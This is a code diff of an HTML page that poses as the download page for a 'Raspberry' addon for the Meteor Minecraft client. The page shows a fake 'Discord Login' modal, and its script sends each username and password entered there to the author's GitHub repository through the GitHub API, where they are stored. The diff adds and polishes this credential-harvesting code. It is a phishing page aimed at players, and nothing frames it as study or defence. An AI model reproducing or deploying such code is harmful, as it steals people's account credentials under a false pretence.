@@ -3,31 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Minecraft Rasberry addon for Meteor Client</title>
-    <!-- Include your main stylesheet -->
-    <link rel="stylesheet" href="styles.css">
+    <title>Minecraft Raspberry Addon for Meteor Client</title>
     <style>
         /* Additional styles specific to your page */
         .hidden {
             display: none;
         }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.4);
+            padding-top: 60px;
+            text-align: center;
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: 5% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+        }
+        .login-container {
+            text-align: left;
+        }
+        .login-container h2 {
+            text-align: center;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"],
+        .login-container input[type="submit"] {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
-    <!-- Your existing HTML content -->
     <header>
         <!-- Navigation, logo, etc. -->
     </header>
 
     <main>
-        <!-- Main content of your page -->
-        <h1>Welcome to RasberryV1</h1>
-        <p>Download Rasberry</p>
+        <h1>Welcome to RaspberryV1</h1>
+        <p>Download Raspberry</p>
 
-        <!-- Example: Login modal -->
+        <!-- Login modal -->
         <div id="loginModal" class="modal">
             <div class="modal-content">
-                <!-- Paste the login form here -->
                 <div class="login-container">
                     <h2>Discord Login</h2>
                     <form id="loginForm">
@@ -38,8 +67,8 @@
                 </div>
             </div>
         </div>
-        
-        <!-- Example: Login button to trigger the modal -->
+
+        <!-- Login button to trigger the modal -->
         <button id="loginBtn">Login</button>
     </main>
 
@@ -47,7 +76,6 @@
         <!-- Footer content -->
     </footer>
 
-    <!-- JavaScript for modal functionality and form handling -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             var loginForm = document.getElementById('loginForm');
@@ -70,65 +98,44 @@
                 var owner = 'SenpaiCummer';
                 var repo = 'SenpaiCummer.github.io';
                 var path = 'information';
-
-                // Current timestamp for commit message
-                var now = new Date();
-                var commitMessage = 'Update login information: ' + now.toISOString();
-
-                // Data to append to the file
-                var data = {
-                    username: username,
-                    password: password
-                };
-
-                // GitHub API endpoint
-                var url = `https://api.github.com/repos/senpaicummer/senpaicummer.github.io/contents/information`;
+                var apiUrl = `https://api.github.com/repos/SenpaiCummer/SenpaiCummer.github.io/contents/information`;
 
                 // Fetch options
-                var options = {
-                    method: 'GET',
-                    headers: {
-                        'Authorization': 'token ' + token
-                    }
+                var headers = {
+                    'Authorization': 'token ' + token,
+                    'Accept': 'application/vnd.github.v3+json'
                 };
 
                 // Get current file contents to append new data
-                fetch(url, options)
+                fetch(apiUrl, { method: 'GET', headers: headers })
                     .then(response => response.json())
                     .then(data => {
-                        // Decode base64 content
-                        var content = JSON.parse(atob(data.content));
+                        var content = data.content ? JSON.parse(atob(data.content)) : [];
 
                         // Add new login information
-                        content.push(data);
+                        content.push({ username: username, password: password });
 
                         // Update file content
-                        return fetch(url, {
+                        return fetch(apiUrl, {
                             method: 'PUT',
-                            headers: {
-                                'Authorization': 'token ' + token,
-                                'Content-Type': 'application/json'
-                            },
+                            headers: headers,
                             body: JSON.stringify({
-                                message: commitMessage,
+                                message: 'Update login information',
                                 content: btoa(JSON.stringify(content)),
                                 sha: data.sha
                             })
                         });
                     })
-                    .then(response => {
-                        if (response.status === 200) {
-                            console.log('Login details saved successfully.');
-                        } else {
-                            console.error('Error saving login details:', response.statusText);
-                        }
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Login details saved successfully.');
                     })
                     .catch(error => {
                         console.error('Error fetching or updating file:', error);
                     });
             }
 
-            // Example JavaScript to show/hide the modal
+            // Show the login modal
             document.getElementById('loginBtn').addEventListener('click', function() {
                 document.getElementById('loginModal').style.display = 'block';
             });
